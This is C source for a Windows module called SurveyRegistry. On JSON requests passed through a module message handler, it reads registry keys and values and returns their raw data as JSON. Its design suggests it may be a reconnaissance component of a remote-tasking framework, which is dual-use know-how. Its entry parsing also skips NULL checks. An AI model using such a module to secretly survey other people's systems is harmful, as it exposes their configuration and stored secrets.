#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_SurveyRegistry.h"
#include "Internal_Functions.h"


// Global variables
cJSON* g_SurveyRegistry_lpJsonSurveyRegistryConfig = NULL;


DWORD WINAPI SurveyRegistryInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonSurveyRegistryInitializeInput = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	cJSON*	lpJsonSurveyRegistryInitializeOutput = NULL;
	CHAR*	szSurveyRegistryOutput = NULL;
	DWORD	dwSurveyRegistryOutputSize = 0;

	__try
	{
		__try
		{ 
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			

			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonSurveyRegistryInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonSurveyRegistryInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_SurveyRegistry_lpJsonSurveyRegistryConfig = lpJsonSurveyRegistryInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonSurveyRegistryInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_SurveyRegistry_Advapi32_Functions()"));
			dwErrorCode = Initialize_SurveyRegistry_Advapi32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_SurveyRegistry_Advapi32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


			/********************************************************************************
				Perform additional initialization actions
			********************************************************************************/


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyRegistry_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_SurveyRegistry_lpJsonSurveyRegistryConfig, 
				SurveyRegistry_Request,
				SurveyRegistryCallbackInterface
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_SurveyRegistry_lpJsonSurveyRegistryConfig,
					SurveyRegistry_Request,
					SurveyRegistryCallbackInterface
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register SurveyRegistry_Request was successful."));
			}


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szSurveyRegistryOutput = cJSON_Print(lpJsonSurveyRegistryInitializeOutput);
			//if (NULL == szSurveyRegistryOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonSurveyRegistryInitializeOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyRegistryOutput:     %p"), szSurveyRegistryOutput);
			////printf("szSurveyRegistryOutput:\n%s\n", szSurveyRegistryOutput);
			//dwSurveyRegistryOutputSize = (DWORD)strlen(szSurveyRegistryOutput);

			//(*lppOutputBuffer) = (LPBYTE)szSurveyRegistryOutput;
			//(*lpdwOutputBufferSize) = dwSurveyRegistryOutputSize;
			
		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonSurveyRegistryInitializeInput)
			{
				cJSON_Delete(lpJsonSurveyRegistryInitializeInput);
				lpJsonSurveyRegistryInitializeInput = NULL;
			}
			if (NULL != lpJsonSurveyRegistryInitializeOutput)
			{
				cJSON_Delete(lpJsonSurveyRegistryInitializeOutput);
				lpJsonSurveyRegistryInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyRegistryFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szSurveyRegistryInput = NULL;
	DWORD	dwSurveyRegistryInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szSurveyRegistryOutput = NULL;
	DWORD	dwSurveyRegistryOutputSize = 0;
	cJSON*	lpJsonSurveyRegistryOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szSurveyRegistryInput = (char*)lpInputBuffer;
			//dwSurveyRegistryInputSize = dwInputBufferSize;


			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyRegistry_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_SurveyRegistry_lpJsonSurveyRegistryConfig,
				SurveyRegistry_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_SurveyRegistry_lpJsonSurveyRegistryConfig,
					SurveyRegistry_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister SurveyRegistry_Request was successful."));
			}

						
			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/


			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_SurveyRegistry_Advapi32_Functions()"));
			dwTempErrorCode = Finalize_SurveyRegistry_Advapi32_Functions();
			if (ERROR_SUCCESS != dwTempErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_SurveyRegistry_Advapi32_Functions() failed.(%08x)"), dwTempErrorCode);
				//__leave;
			}
			
		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_SurveyRegistry_lpJsonSurveyRegistryConfig)
			{
				cJSON_Delete(g_SurveyRegistry_lpJsonSurveyRegistryConfig);
				g_SurveyRegistry_lpJsonSurveyRegistryConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI SurveyRegistryCallbackInterface(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode				= ERROR_SUCCESS;
	DWORD	dwTempErrorCode			= ERROR_SUCCESS;

	CHAR*	szSurveyRegistryInput = NULL;
	DWORD	dwSurveyRegistryInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonSurveyRegistryRequestEntries = NULL;
	cJSON*	lpJsonSurveyRegistryRequestEntry = NULL;

	CHAR*	szSurveyRegistryOutput = NULL;
	DWORD	dwSurveyRegistryOutputSize = 0;
	cJSON*	lpJsonSurveyRegistryOutput = NULL;
	//cJSON*	lpJsonSurveyRegistryResponse = NULL;
	cJSON*	lpJsonSurveyRegistryResponseRegistryResults = NULL;

	DWORD	dwRequestIndex = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);


			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szSurveyRegistryInput = (char*)lpInputBuffer;
			dwSurveyRegistryInputSize = dwInputBufferSize;
			

			/********************************************************************************
				Check input for new configuration
			********************************************************************************/
			lpJsonInput = cJSON_Parse(szSurveyRegistryInput);
			if (NULL == lpJsonInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}
			

			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create the output JSON object
			lpJsonSurveyRegistryOutput = cJSON_CreateObject();
			if (NULL == lpJsonSurveyRegistryOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyRegistryOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}
			
			//// Create the SurveyRegistry_Response JSON object
			//lpJsonSurveyRegistryResponse = cJSON_AddObjectToObject(lpJsonSurveyRegistryOutput, SurveyRegistry_Response);
			//if (NULL == lpJsonSurveyRegistryResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonSurveyRegistryResponse = cJSON_AddObjectToObject(%p, %S) failed.\n"),
			//		lpJsonSurveyRegistryOutput, SurveyRegistry_Response
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyRegistryResponse:    %p"), lpJsonSurveyRegistryResponse);

			// Create an array of SurveyRegistry_Response_Results JSON objects
			lpJsonSurveyRegistryResponseRegistryResults = cJSON_AddArrayToObject(lpJsonSurveyRegistryOutput, SurveyRegistry_Response_Results);
			if (NULL == lpJsonSurveyRegistryResponseRegistryResults)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyRegistryResponseRegistryResults = cJSON_AddArrayToObject(%p,%S) failed."),
					lpJsonSurveyRegistryOutput,
					SurveyRegistry_Response_Results
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyRegistryResponseRegistryResults:    %p"), lpJsonSurveyRegistryResponseRegistryResults);


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the array of SurveyRegistry_Request_Entries
			lpJsonSurveyRegistryRequestEntries = cJSON_GetObjectItemCaseSensitive(lpJsonInput, SurveyRegistry_Request_Entries);
			if (NULL == lpJsonSurveyRegistryRequestEntries)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInput,
					SurveyRegistry_Request_Entries
				);
				__leave;
			}
			// Loop through each request entry and perform the actual request
			dwRequestIndex = 0;
			cJSON_ArrayForEach(lpJsonSurveyRegistryRequestEntry, lpJsonSurveyRegistryRequestEntries)
			{
				LPSTR szEntry = NULL;
				LPSTR szKeyRoot = NULL;
				LPSTR szSubKey = NULL;
				LPSTR szValueName = NULL;
				PCHAR lpchToken = NULL;
				HKEY hKeyRoot = NULL;
				HKEY hKey = NULL;

				// Make sure that the request entry JSON object is a string
				if (
					!cJSON_IsString(lpJsonSurveyRegistryRequestEntry) ||
					(NULL == lpJsonSurveyRegistryRequestEntry->valuestring)
					)
				{
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("cJSON_IsString(%p) failed."),
						lpJsonSurveyRegistryRequestEntry
					);
					continue;
				}
					

				szEntry = lpJsonSurveyRegistryRequestEntry->valuestring;
				DBGPRINT(DEBUG_VERBOSE, TEXT("%S[%d]: %S"), SurveyRegistry_Request_Entries, dwRequestIndex, szEntry);

				// Get the root key name
				lpchToken = strchr(szEntry, ':');
				*lpchToken = '\0';
				szKeyRoot = szEntry;
				szEntry = lpchToken + 1;

				// Get the subkey name
				lpchToken = strrchr(szEntry, '\\');
				*lpchToken = '\0';
				szSubKey = szEntry + 1;
				szEntry = lpchToken + 1;

				// Get the value name
				szValueName = szEntry;

				// Advance entry to the next entry
				while (*szEntry != '\0')
					szEntry++;
				szEntry++;

				//DBGPRINT(DEBUG_VERBOSE, TEXT("szKeyRoot:  %S"), szKeyRoot);
				//DBGPRINT(DEBUG_VERBOSE, TEXT("szSubKey:   %S"), szSubKey);
				//DBGPRINT(DEBUG_VERBOSE, TEXT("szValueName: %S"), szValueName);

				// Determine the root key
				if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_CLASSES_ROOT))
				{
					hKeyRoot = HKEY_CLASSES_ROOT;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_CURRENT_CONFIG))
				{
					hKeyRoot = HKEY_CURRENT_CONFIG;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_CURRENT_USER))
				{
					hKeyRoot = HKEY_CURRENT_USER;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_CURRENT_USER_LOCAL_SETTINGS))
				{
					hKeyRoot = HKEY_CURRENT_USER_LOCAL_SETTINGS;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_LOCAL_MACHINE))
				{
					hKeyRoot = HKEY_LOCAL_MACHINE;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_PERFORMANCE_DATA))
				{
					hKeyRoot = HKEY_PERFORMANCE_DATA;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_PERFORMANCE_NLSTEXT))
				{
					hKeyRoot = HKEY_PERFORMANCE_NLSTEXT;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_PERFORMANCE_TEXT))
				{
					hKeyRoot = HKEY_PERFORMANCE_TEXT;
				}
				else if (0 == strcmp(szKeyRoot, SZ_SurveyRegistry_HKEY_USERS))
				{
					hKeyRoot = HKEY_USERS;
				}
				else
				{
					hKeyRoot = NULL;
					DBGPRINT(DEBUG_WARNING, TEXT("Invalid szKeyRoot:  %S"), szKeyRoot);
					continue;
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("hKeyRoot:  %p"), hKeyRoot);


				// Open the sub key
				//DBGPRINT(
				//	DEBUG_VERBOSE,
				//	TEXT("RegOpenKeyExA( %p, %S, %p, %08x, %p )..."),
				//	hKeyRoot,
				//	szSubKey,
				//	0,
				//	KEY_READ,
				//	&hKey
				//);
				dwTempErrorCode = m_SurveyRegistry_RegOpenKeyExA(
					hKeyRoot,
					szSubKey,
					0,
					KEY_READ,
					&hKey
				);
				if (ERROR_SUCCESS != dwTempErrorCode)
				{
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("RegOpenKeyExA( %p, %S, %p, %08x, %p ) failed.(%08x)"),
						hKeyRoot,
						szSubKey,
						0,
						KEY_READ,
						&hKey,
						dwTempErrorCode
					);
					continue;
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("hKey:  %p"), hKey);


				// Enumerate all the values
				for (DWORD dwValueIndex = 0; dwValueIndex != (DWORD)-1; dwValueIndex++)
				{
					CHAR	achValue[MAX_VALUE_NAME];
					DWORD	cchValue = MAX_VALUE_NAME;
					DWORD	dwType = REG_NONE;
					//BYTE	bData = 0;
					LPBYTE	lpData = NULL;
					DWORD	cbData = 0;

					cchValue = MAX_VALUE_NAME;
					ZeroMemory(achValue, cchValue);


					//lpData = &bData;
					//lpData = NULL;
					//DBGPRINT(DEBUG_VERBOSE, TEXT("lpData:  %p"), lpData);
					// First call to get size of data
					//DBGPRINT(
					//	DEBUG_VERBOSE,
					//	TEXT("RegEnumValueA( %p, %d, %p, %p, %p, %p, %p, %p ) to get size of data..."),
					//	hKey,
					//	dwValueIndex,
					//	achValue,
					//	&cchValue,
					//	NULL,
					//	&dwType,
					//	lpData,
					//	&cbData
					//);
					dwTempErrorCode = m_SurveyRegistry_RegEnumValueA(
						hKey,
						dwValueIndex,
						achValue,
						&cchValue,
						NULL,
						&dwType,
						lpData,
						&cbData
					);
					if (ERROR_NO_MORE_ITEMS == dwTempErrorCode)
					{
						//DBGPRINT(DEBUG_VERBOSE, TEXT("No more values, next entry"));
						break;
					}
					if (ERROR_SUCCESS != dwTempErrorCode)
					{
						DBGPRINT(
							DEBUG_WARNING,
							TEXT("RegEnumValueA( %p, %d, %p, %p, %p, %p, %p, %p ) failed. (%08x)"),
							hKey,
							dwValueIndex,
							achValue,
							&cchValue,
							NULL,
							&dwType,
							lpData,
							&cbData,
							dwTempErrorCode
						);
						continue;
					}
					//if ((0 < cbData) && (ERROR_MORE_DATA == dwTempErrorCode))
					if (0 < cbData)
					{
						cbData++;
						// Allocate buffer large enough for data
						dwTempErrorCode = ALLOC(cbData, (LPVOID*)(&lpData));
						if (ERROR_SUCCESS != dwTempErrorCode)
						{
							DBGPRINT(
								DEBUG_WARNING,
								TEXT("ALLOC( %d, %p ) failed.(%08x)"),
								cbData,
								lpData,
								dwTempErrorCode
							);
							continue;
						}

						cchValue = MAX_VALUE_NAME;
						ZeroMemory(achValue, cchValue);

						// Second call to get value data
						//DBGPRINT(
						//	DEBUG_VERBOSE,
						//	TEXT("RegEnumValueA( %p, %d, %p, %p, %p, %p, %p, %p ) to get data..."),
						//	hKey,
						//	dwValueIndex,
						//	achValue,
						//	&cchValue,
						//	NULL,
						//	&dwType,
						//	lpData,
						//	&cbData
						//);
						dwTempErrorCode = m_SurveyRegistry_RegEnumValueA(
							hKey,
							dwValueIndex,
							achValue,
							&cchValue,
							NULL,
							&dwType,
							lpData,
							&cbData
						);
						if (ERROR_SUCCESS != dwTempErrorCode)
						{
							DBGPRINT(
								DEBUG_WARNING,
								TEXT("RegEnumValueA( %p, %d, %p, %p, %p, %p, %p, %p ) failed. (%08x)"),
								hKey,
								dwValueIndex,
								achValue,
								&cchValue,
								NULL,
								&dwType,
								lpData,
								&cbData,
								dwTempErrorCode
							);
							continue;
						}
					} // end if there is value data to fill-in

					DBGPRINT(DEBUG_VERBOSE, TEXT("cchValue:  %d"), cchValue);
					DBGPRINT(DEBUG_VERBOSE, TEXT("achValue:  %S"), achValue);
					DBGPRINT(DEBUG_VERBOSE, TEXT("dwType:    %08x"), dwType);
					DBGPRINT(DEBUG_VERBOSE, TEXT("cbData:    %d"), cbData);
					DBGPRINT(DEBUG_VERBOSE, TEXT("lpData:    %p"), lpData);
					if ((REG_SZ == dwType) || (REG_EXPAND_SZ == dwType))
					{
						DBGPRINT(DEBUG_VERBOSE, TEXT("lpData:    %S"), lpData);
					}

					// Check if we are interested in this value
					if (
						(0 == strcmp("*", szValueName)) ||												// wildcard specified for value name
						((0 < strlen(szValueName)) && (0 == strcmp(szValueName, achValue))) ||		// specified value name matches current value name
						((0 == strlen(szValueName)) && (0 == strlen(achValue)))						// default value specifed
						)
					{
						cJSON* lpJsonSurveyRegistryResponseRegistryResult = NULL;
						cJSON* lpJsonKeyRoot = NULL;
						cJSON* lpJsonSubKey = NULL;
						cJSON* lpJsonValue = NULL;
						cJSON* lpJsonType = NULL;
						cJSON* lpJsonDataSize = NULL;
						cJSON* lpJsonData = NULL;

						DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyRegistryResponseRegistryResult = cJSON_CreateObject()"));
						lpJsonSurveyRegistryResponseRegistryResult = cJSON_CreateObject();
						if (NULL == lpJsonSurveyRegistryResponseRegistryResult)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonSurveyRegistryResponseRegistryResult = cJSON_CreateObject() failed.\n")
							);
							__leave;
						}
						DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyRegistryResponseRegistryResult:    %p"), lpJsonSurveyRegistryResponseRegistryResult);

						DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonKeyRoot = cJSON_CreateString(szKeyRoot)"));
						lpJsonKeyRoot = cJSON_CreateString(szKeyRoot);
						if (NULL == lpJsonKeyRoot)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonKeyRoot = cJSON_CreateString failed.\n")
							);
							__leave;
						}
						cJSON_AddItemToObject(lpJsonSurveyRegistryResponseRegistryResult, SurveyRegistry_Response_Results_RootKey, lpJsonKeyRoot);

						DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSubKey = cJSON_CreateString(szSubKey)"));
						lpJsonSubKey = cJSON_CreateString(szSubKey);
						if (NULL == lpJsonSubKey)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonSubKey = cJSON_CreateString failed.\n")
							);
							__leave;
						}
						cJSON_AddItemToObject(lpJsonSurveyRegistryResponseRegistryResult, SurveyRegistry_Response_Results_SubKey, lpJsonSubKey);

						lpJsonValue = cJSON_CreateString(achValue);
						if (NULL == lpJsonValue)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonValue = cJSON_CreateString failed.\n")
							);
							__leave;
						}
						cJSON_AddItemToObject(lpJsonSurveyRegistryResponseRegistryResult, SurveyRegistry_Response_Results_Value, lpJsonValue);

						lpJsonType = cJSON_CreateNumber(dwType);
						if (NULL == lpJsonType)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonType = cJSON_CreateNumber failed.\n")
							);
							__leave;
						}
						cJSON_AddItemToObject(lpJsonSurveyRegistryResponseRegistryResult, SurveyRegistry_Response_Results_Type, lpJsonType);

						lpJsonDataSize = cJSON_CreateNumber(cbData);
						if (NULL == lpJsonDataSize)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonDataSize = cJSON_CreateNumber failed.\n")
							);
							__leave;
						}
						cJSON_AddItemToObject(lpJsonSurveyRegistryResponseRegistryResult, SurveyRegistry_Response_Results_DataSize, lpJsonDataSize);

						lpJsonData = cJSON_CreateBytes(lpData, cbData);
						if (NULL == lpJsonData)
						{
							dwErrorCode = ERROR_OBJECT_NOT_FOUND;
							DBGPRINT(
								DEBUG_ERROR,
								TEXT("lpJsonData = cJSON_CreateBytes failed.\n")
							);
							__leave;
						}
						cJSON_AddItemToObject(lpJsonSurveyRegistryResponseRegistryResult, SurveyRegistry_Response_Results_Data, lpJsonData);

						DBGPRINT(DEBUG_VERBOSE, TEXT("cJSON_AddItemToArray(lpJsonSurveyRegistryResponseRegistryResults, lpJsonSurveyRegistryResponseRegistryResult)"));
						DBGPRINT(DEBUG_VERBOSE, TEXT("cJSON_AddItemToArray(%p, %p)"), lpJsonSurveyRegistryResponseRegistryResults, lpJsonSurveyRegistryResponseRegistryResult);
						// Add current entry to overall results list
						cJSON_AddItemToArray(lpJsonSurveyRegistryResponseRegistryResults, lpJsonSurveyRegistryResponseRegistryResult);

					} // end if we are interested in this value

					// Free any data buffers
					if (NULL != lpData)
					{
						FREE(lpData);
						lpData = NULL;
					}
					cbData = 0;

				} // end for (DWORD dwValueIndex = 0; dwValueIndex != (DWORD)-1; dwValueIndex++)


				// Clsoe the current subkey
				if (NULL != hKey)
				{
					dwTempErrorCode = m_SurveyRegistry_RegCloseKey(hKey);
					if (ERROR_SUCCESS != dwTempErrorCode)
					{
						DBGPRINT(
							DEBUG_WARNING,
							TEXT("RegCloseKey( %p ) failed.(%08x)"),
							hKey,
							dwTempErrorCode
						);
						continue;
					}
				}

				dwRequestIndex++;

			} // end cJSON_ArrayForEach(lpJsonSurveyRegistryRequestEntry, lpJsonSurveyRegistryRequestEntries)

			
			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szSurveyRegistryOutput = cJSON_Print(lpJsonSurveyRegistryOutput);
			if (NULL == szSurveyRegistryOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonSurveyRegistryOutput
				);
				__leave;
			}
			dwSurveyRegistryOutputSize = (DWORD)strlen(szSurveyRegistryOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwSurveyRegistryOutputSize: %d"), dwSurveyRegistryOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyRegistryOutput:     %p"), szSurveyRegistryOutput);
			//printf("szSurveyRegistryOutput:\n%s\n", szSurveyRegistryOutput);
			
			(*lppOutputBuffer) = (LPBYTE)szSurveyRegistryOutput;
			(*lpdwOutputBufferSize) = dwSurveyRegistryOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}

			if (NULL != lpJsonSurveyRegistryOutput)
			{
				cJSON_Delete(lpJsonSurveyRegistryOutput);
				lpJsonSurveyRegistryOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szSurveyRegistryOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}
